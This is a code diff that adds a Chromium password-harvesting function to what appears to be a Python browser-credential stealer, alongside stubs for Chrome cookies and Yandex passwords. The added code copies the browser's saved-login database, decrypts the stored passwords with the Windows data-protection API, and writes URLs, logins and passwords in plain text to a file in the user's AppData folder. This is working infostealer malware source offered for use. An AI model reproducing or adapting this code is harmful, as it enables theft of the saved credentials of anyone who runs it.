@@ -68,6 +68,27 @@ file.close()
 def Chrome_cockie():
    pass
 ################################################################################
+#                              CHROMIUM PASSWORDS                              #
+################################################################################
+def chromium():
+   textch ='Chromium Passwords:' + '\n'
+   textch += 'URL | LOGIN | PASSWORD' + '\n'
+   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
+       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
+       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
+       cursor = conn.cursor()
+       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+       for result in cursor.fetchall():
+           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+           login = result[1]
+           url = result[0]
+           if password != '':
+               textch += url + ' | ' + login + ' | ' + password + '\n'
+               return textch
+file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")
+file.write(str(chromium()) + '\n')
+file.close()
+################################################################################
 #                              YANDEX PASSWORDS                                #
 ################################################################################
 def Yandexpass():
